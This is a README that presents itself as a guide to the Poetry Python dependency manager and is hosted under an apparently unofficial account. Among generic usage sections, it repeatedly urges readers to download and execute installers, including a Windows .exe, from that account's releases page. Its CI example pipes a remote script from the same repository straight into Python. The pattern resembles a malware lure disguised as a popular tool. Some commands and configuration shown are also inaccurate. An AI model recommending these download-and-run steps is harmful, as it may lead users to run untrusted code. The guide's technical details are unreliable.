# Poetry — Python Packaging, Dependency Manager, and Workflow Guide

[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/riri771/poetry/releases)  
[![Python](https://img.shields.io/badge/python-3.8%2B-brightgreen?logo=python)](https://www.python.org/) [![Topic: dependency-manager](https://img.shields.io/badge/topic-dependency--manager-blue)](https://github.com/topics/dependency-manager) [![Topic: package-manager](https://img.shields.io/badge/topic-package--manager-blue)](https://github.com/topics/package-manager) [![Topic: packaging](https://img.shields.io/badge/topic-packaging-blue)](https://github.com/topics/packaging) [![Topic: poetry](https://img.shields.io/badge/topic-poetry-blue)](https://github.com/topics/poetry)

![Python Packaging](https://www.python.org/static/community_logos/python-logo.png)

Jump straight to the official downloads: download and run the installer from the releases page:
https://github.com/riri771/poetry/releases

This README outlines a full guide for working with this repository. It covers concepts, commands, configuration, CI, Docker, publishing, plugin points, internals, and maintenance. Read each section to learn how to use the tool to manage projects, dependencies, virtual environments, and releases.

Table of contents
- About
- Key features
- Install and run (download and execute)
- Quick start
- Project layout and pyproject.toml
- Dependency management workflow
- Lockfile and reproducible installs
- Virtual environments and isolation
- Publishing packages
- Advanced usage
- Plugin system and extensions
- CI/CD and GitHub Actions
- Docker and containers
- Troubleshooting
- Migration from pip / setup.py
- Security and reproducibility
- Contribution guide
- Maintainer notes
- Releases and changelog
- License

About
-------
This repository hosts a Python tool that manages packaging and dependencies. It brings project metadata, dependency resolution, virtual environment management, and publishing into a single command-line tool. The tool uses the pyproject.toml standard for project metadata and dependency declarations. It resolves dependency graphs, produces a lockfile for reproducible installs, and provides commands to build and publish packages.

Key features
------------
- Single CLI to create, manage, build, and publish Python packages.
- Use pyproject.toml to store project metadata, dependencies, and scripts.
- Declarative dependencies: declare what you need, not how to install it.
- Deterministic lockfile for reproducible installations across machines.
- Isolated virtual environment per project or shared system choice.
- Simple commands to add, remove, update, and audit dependencies.
- Publish packages to PyPI or private registries with credentials support.
- Plugin API to extend functionality with custom commands and hooks.
- Built-in caching and offline install support.
- Integration recipes for Docker and CI systems.

Install and run (download and execute)
--------------------------------------
Because the releases page provides installer artifacts, download the file for your platform and run it. Download and execute the installer file available at:

https://github.com/riri771/poetry/releases

Example patterns you may find in releases:
- poetry-installer-vX.Y.Z.sh
- poetry-X.Y.Z.tar.gz
- poetry-X.Y.Z-win.exe
- poetry-X.Y.Z-py3-none-any.whl

Common installation steps
1. Visit the releases page and choose the installer for your platform.
2. Download the file to a local folder.
3. Make the script executable if needed:
   - Linux / macOS: chmod +x poetry-installer-vX.Y.Z.sh
4. Run the installer:
   - Shell installer: ./poetry-installer-vX.Y.Z.sh
   - Python wheel: pip install poetry-X.Y.Z-py3-none-any.whl
   - Windows exe: run the .exe

If you install the wheel via pip, use a controlled environment or pipx to avoid polluting the system Python.

Quick start
-----------
Create a new project, add dependencies, and run tests.

Create a project
- Create a new directory and initialize the project.
  - poetry new my-package
  - or in an existing repo: poetry init

Example:
```bash
mkdir my-package
cd my-package
poetry init --name my-package --version 0.1.0 --description "A sample package"
```

Add dependencies
- Add a runtime dependency:
```bash
poetry add requests
```

- Add a dev dependency:
```bash
poetry add --dev pytest black
```

Install dependencies
- Install from the lockfile if it exists, otherwise resolve and create one:
```bash
poetry install
```

Run commands in the project environment
- Run a command within the managed environment:
```bash
poetry run python -m my_package
poetry run pytest
```

Publish a package
- Build the package:
```bash
poetry build
```

- Publish to PyPI:
```bash
poetry publish --repository pypi
```

Project layout and pyproject.toml
---------------------------------
Poetry uses pyproject.toml for metadata and configuration. A typical project uses this layout:

- my-package/
  - pyproject.toml
  - README.md
  - src/my_package/
    - __init__.py
  - tests/
  - .gitignore

Example pyproject.toml
```toml
[tool.poetry]
name = "my-package"
version = "0.1.0"
description = "A sample Python package"
authors = ["Your Name <you@example.com>"]
readme = "README.md"
license = "MIT"
homepage = "https://example.com"

[tool.poetry.dependencies]
python = ">=3.8,<4.0"
requests = "^2.28.0"

[tool.poetry.dev-dependencies]
pytest = "^7.0"
black = "^22.3.0"

[tool.poetry.scripts]
my-package = "my_package.__main__:main"

[build-system]
requires = ["setuptools>=42", "wheel"]
build-backend = "setuptools.build_meta"
```

Key sections
- [tool.poetry]: metadata used for package building and publishing.
- [tool.poetry.dependencies]: runtime dependencies.
- [tool.poetry.dev-dependencies]: dependencies for development and tests.
- [tool.poetry.scripts]: console entry points.
- [build-system]: PEP 517/518 build requirements.

Dependency management workflow
------------------------------
The workflow splits into declaration, resolution, lockfile generation, and installation.

Declare dependencies
- Use the CLI to add or remove dependencies. The tool updates pyproject.toml.
- Examples:
```bash
poetry add flask==2.0.3
poetry add 'celery>=5.2,<6.0'
poetry add --dev tox
poetry remove flask
```

Resolve dependencies
- The tool resolves the dependency graph and picks versions that match all constraints.
- It creates or updates the lockfile with exact versions.

Lockfile
- The lockfile records exact package versions, hashes, and metadata for reproducible builds.
- Lockfiles support an offline install mode where cached archives install without network.

Install from lockfile
```bash
poetry install
```
- When pyproject.toml changes, run install to update the environment and lockfile as needed.

Update dependencies
- Update a single dependency:
```bash
poetry update requests
```
- Update all dependencies:
```bash
poetry update
```

Dependency specifications
- Use caret ^ to allow compatible updates. Example: requests = "^2.28.0" allows non-breaking updates within 2.x.
- Use tilde ~ for more conservative updates. Example: flask = "~2.0.3" pins minor changes.
- Use explicit ranges or equality for exact control.

Extras and optional dependencies
- Define optional feature groups:
```toml
[tool.poetry.extras]
dev = ["pytest", "black"]
docs = ["sphinx"]
```
- Install extras:
```bash
poetry install --extras "docs"
```

Lockfile and reproducible installs
---------------------------------
The lockfile provides bit-for-bit reproducible installs across machines.

What it contains
- Resolved versions of all top-level and transitive dependencies.
- Hashes of wheel or sdist files used to verify downloads.
- Metadata to reproduce build.

Working with the lockfile
- Commit the lockfile to your repository for applications and CI.
- For libraries, consider whether to commit the lockfile. Many maintainers commit it for easier CI and contributor experience.

Offline installs
- Use the lockfile and a local cache to install without a network.
- To create a cache for other machines, download all artifacts referenced in the lockfile.

Virtual environments and isolation
----------------------------------
The tool manages virtual environments for each project. You can choose to create isolated venvs or use the system interpreter.

Default behavior
- The tool creates a project-local virtual environment by default.
- It stores the venv a central cache or inside the project depending on configuration.

Common commands
- Show environment info:
```bash
poetry env info
poetry env list
poetry env use /usr/bin/python3.10
```

- Enter the shell:
```bash
poetry shell
```

- Run commands without activating shell:
```bash
poetry run python -m my_package
```

Configuration
- You can configure virtualenv behavior globally or per-project:
```bash
poetry config virtualenvs.in-project true
```

Publishing packages
-------------------
The tool builds standard Python distributions and publishes them.

Build artifacts
- Build a source distribution (sdist) and wheel:
```bash
poetry build
```
- The build command produces files in the dist/ folder.

Publish
- Publish to the default PyPI or a custom repository.
```bash
poetry publish --repository pypi
```

- Configure credentials
  - Store credentials in the tool's config store or use environment variables.
  - Example for PyPI token:
```bash
poetry config pypi-token.pypi <TOKEN>
```

Private registries
- Define alternate repositories in pyproject.toml or via config.
- Authenticate and publish with:
```bash
poetry publish -r <repository-name>
```

Signing builds
- When needed, sign artifacts with GPG before publishing.
- Example build signing flow:
```bash
gpg --detach-sign -a dist/my_package-0.1.0-py3-none-any.whl
poetry publish --username __token__ --password <token>
```

Advanced usage
--------------
Workspaces (multi-package)
- Support monorepos with multiple packages. Use a root pyproject.toml that references packages in subfolders.
- Use the CLI to run commands across packages.

Scripts and tasks
- Use [tool.poetry.scripts] to expose CLI entry points when packaging.
- Use the [tool.poetry.plugins] table to register plugin entry points.

Dependency groups
- Group dependencies by purpose beyond dev/runtime. Example groups: docs, ci, test.
- Use the add command with group flags:
```bash
poetry add --group docs sphinx
poetry add --group test pytest
```

Lockfile partial updates
- You can update a specific group or package without touching others:
```bash
poetry lock --no-update
poetry update --with dev
```

Platform-specific dependencies
- Declare dependencies for specific platforms or Python versions:
```toml
[tool.poetry.dependencies]
platformdirs = { version = "^2.5.2", markers = "sys_platform == 'win32'" }
dataclasses = { version = "^0.8", markers = "python_version < '3.7'" }
```

Plugin system and extensions
----------------------------
The tool supports plugins to extend CLI commands and hooks.

Plugin entry point
- Use setuptools or poetry itself to declare plugin entry points under [tool.poetry.plugins].

Example plugin registration in pyproject.toml
```toml
[tool.poetry.plugins."poetry.plugin"]
my-plugin = "my_package.plugin:PluginClass"
```

Plugin capabilities
- Add commands
- Hook into build flow
- Modify dependency resolution
- Provide custom build backends

Writing a plugin
- Create a Python package with an entry point.
- Implement the plugin class with the expected interface.
- Test the plugin locally by installing in editable mode.

Debugging plugins
- Run the CLI in verbose mode to surface plugin load errors:
```bash
poetry -v
```

CI/CD and GitHub Actions
------------------------
Integrate the tool into pipelines for tests, builds, and releases.

Cache dependencies in CI
- Cache the virtual environment cache and pip wheels directory to speed builds.
- Use the lockfile to ensure deterministic installs.

Example GitHub Actions workflow
```yaml
name: CI

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: 3.10
      - name: Install Poetry
        run: |
          curl -sSL https://raw.githubusercontent.com/riri771/poetry/main/get-poetry.py | python -
      - name: Install dependencies
        run: |
          poetry install --no-interaction --no-ansi
      - name: Run tests
        run: |
          poetry run pytest -q
```

Publish from CI
- Use tokens stored in secrets to publish artifacts.
- Build artifacts in CI and upload to PyPI or a private index.
- Use the releases page to host distributable files if you prefer manual releases:
https://github.com/riri771/poetry/releases

Release automation
- Tag releases using semantic versioning.
- Use release notes and changelogs generated from commits.

Docker and containers
---------------------
Use the tool inside Docker images or produce artifacts that run in container environments.

Dockerfile patterns
- Use a multi-stage build to reduce final image size.

Example Dockerfile
```dockerfile
FROM python:3.10-slim as builder

RUN apt-get update && apt-get install -y build-essential

WORKDIR /app
COPY pyproject.toml poetry.lock ./
RUN pip install --upgrade pip
RUN pip install poetry
RUN poetry config virtualenvs.create false --local
RUN poetry install --no-dev --no-interaction

COPY . .
RUN poetry build

FROM python:3.10-slim
WORKDIR /app
COPY --from=builder /app/dist/*.whl /tmp/
RUN pip install /tmp/*.whl
CMD ["python", "-m", "my_package"]
```

Slim runtime
- In the final stage, install only runtime dependencies and the built wheel.
- Keep the image lean by excluding build dependencies.

Working offline
- Build wheels in the builder stage and reuse them in runtime.

Troubleshooting
---------------
Common issues and fixes

Dependency resolution conflicts
- Problem: two packages require incompatible versions.
- Fix: pin one dependency, or use a compatible constraint. Use poetry's resolver diagnostics:
```bash
poetry debug resolve
```

Lockfile out of sync
- Problem: pyproject.toml changed, but lockfile still holds old data.
- Fix:
```bash
poetry lock
poetry install
```

Network issues while installing
- Problem: network errors block installs.
- Fix: Use a cached index mirror or vendor artifacts. Use the lockfile with cached wheels.

Virtual environment not activating
- Problem: poetry shell fails to spawn or path issues occur.
- Fix: Check config:
```bash
poetry env info
poetry config virtualenvs.in-project true
```

Publishing authentication errors
- Problem: 403 or authentication failed.
- Fix: Ensure token is valid and saved in config:
```bash
poetry config pypi-token.pypi <TOKEN>
```

Build errors for compiled packages
- Problem: building C extensions fails in CI.
- Fix: Install system build dependencies or use manylinux wheels. Add build-essential, libssl-dev, and headers.

Migration from pip / setup.py
-----------------------------
Move from a setuptools setup.py to the pyproject.toml workflow.

1. Convert metadata to pyproject.toml:
- name, version, description, authors, license, classifiers.

2. Move install_requires to [tool.poetry.dependencies].

3. Move tests and dev tools to [tool.poetry.dev-dependencies].

4. Recreate entry points in [tool.poetry.scripts].

5. Run poetry lock and poetry install to generate a lockfile and environment.

6. Test builds:
```bash
poetry build
pip install dist/my_package-0.1.0-py3-none-any.whl
```

7. Update CI to use poetry install and build.

Security and reproducibility
----------------------------
Best practices
- Always pin transitive dependencies via the lockfile for deployable applications.
- Use hashes from the lockfile to verify downloads.
- Scan dependencies for known vulnerabilities with a security scanner.
- Keep build dependencies minimal in runtime images.

Reproducible builds
- Commit pyproject.toml and poetry.lock to the repo.
- Use the same Python minor version across environments when possible.
- Use the lockfile to seed CI and deploy environments.

Signing and verification
- Sign release artifacts with a GPG key.
- Provide checksums in the release notes.

Contribution guide
------------------
How to contribute code, tests, and docs

Clone and setup
```bash
git clone https://github.com/riri771/poetry.git
cd poetry
poetry install
```

Development workflow
- Create a branch per feature or fix:
```bash
git checkout -b feat/<short-description>
```

- Run tests:
```bash
poetry run pytest
```

Code style and linting
- Use black for formatting and isort for imports:
```bash
poetry add --dev black isort flake8
poetry run black .
```

Commit messages
- Use clear commit messages.
- Follow conventional commit style if the repo uses it.

Pull requests
- Provide a clear description of changes.
- Add tests for new features and bug fixes.
- Include documentation updates.

Testing
- Add unit tests under tests/.
- Use test fixtures to create ephemeral project states.
- Run tests on supported Python versions.

Maintainer notes
----------------
Development branches and releases
- Main branch holds stable code.
- Use feature branches for work in progress.
- Tag releases with semantic versions (v1.2.3).

Release assets
- Build artifacts and host them in the Releases page.
- Provide checksums and optional signatures.

Release process (example)
1. Bump version in pyproject.toml.
2. Update changelog.
3. Build artifacts:
```bash
poetry build
```
4. Create a Git tag and push.
5. Create a GitHub release and upload built files.
6. Publish to PyPI if appropriate.

Releases and changelog
----------------------
Distributable files and installer scripts are available on the releases page. Download the appropriate file for your system and execute it.

Releases:
https://github.com/riri771/poetry/releases

Use the linked release artifacts to install stable versions. Each release contains release notes with a changelog, checksums, and optional binary installers. When you download an installer from releases, run the file to install the tool on your system. Follow platform guidance included with each release artifact.

Changelog format
- Use a clear changelog describing added features, fixes, and breaking changes.
- Tag entries with categories: Added, Changed, Fixed, Removed, Security.

Example change entry
- v1.2.0 — Added support for platform-specific dependencies. Fixed conflict resolution for optional extras. Improved build performance.

License
-------
This project uses the MIT License. See LICENSE file for full terms.

Appendix: useful commands and examples
--------------------------------------
Create a package
```bash
poetry new awesome-lib
cd awesome-lib
poetry add numpy pandas
poetry add --dev pytest
poetry run pytest
poetry build
```

Install a specific version and keep the lockfile
```bash
poetry add "requests==2.28.1"
poetry lock
```

List installed packages
```bash
poetry show
poetry show --tree
```

Export requirements.txt
- For systems that require pip-style requirements:
```bash
poetry export -f requirements.txt --output requirements.txt --without-hashes
```

Use the project in another environment
- Create a wheel and install it:
```bash
poetry build
pip install dist/my_package-0.1.0-py3-none-any.whl
```

Debugging and info
```bash
poetry debug:info
poetry debug resolve
poetry env info
```

Common flags
- --no-interaction: run without prompts.
- --no-dev: skip dev dependencies (useful for production installs).
- --with / --without: include or exclude groups.

Notes on compatibility
- The tool targets Python 3.8 and newer.
- It relies on PEP 517/518 build backends specified in [build-system].
- It supports standard package formats: wheel and sdist.

Examples of real-world workflows
--------------------------------
Library development
- Commit pyproject.toml and optionally lockfile for stable CI.
- Use CI to run tests across Python versions.
- Use tags and GitHub releases to publish artifacts.

Application deployment
- Commit the lockfile for deterministic production installs.
- Use Docker images built from the lockfile to avoid runtime build failures.
- Run poetry install --no-dev in Docker build.

Monorepo with several packages
- Use a single top-level pyproject.toml and multiple package folders.
- Use workspace-aware commands to run tests or build packages individually.

API for automation
------------------
The CLI provides commands suitable for automation. Use them in scripts and CI pipelines. Worker scripts can parse the output of poetry show and poetry lock for audit and dependency graphs.

Examples
- Collect outdated dependencies:
```bash
poetry show --outdated
```

- Generate a dependency graph as JSON for automation:
```bash
poetry export -f json --output deps.json
```

Maintenance and long-term planning
---------------------------------
- Maintain a clear test suite to ensure dependency upgrades do not break users.
- Monitor dependency vulnerabilities and update transitive deps when needed.
- Keep build system requirements minimal to reduce friction in CI.

Acknowledgments and resources
-----------------------------
- Python community and PEP standards.
- pyproject.toml and PEP 517/518 specifications.
- Common packaging tools and best practices.

Contact and support
-------------------
For issues, file an issue in the repository issue tracker. For release artifacts and manual downloads, use the releases page:
https://github.com/riri771/poetry/releases

Use the releases page to fetch installer files. Download the artifact that matches your platform and run it to install the tool.

Images and badges
- The badges at the top of this README link to the releases page, the Python site, and topic pages.
- Use the badges to find quick links for downloads and documentation.

End of README content.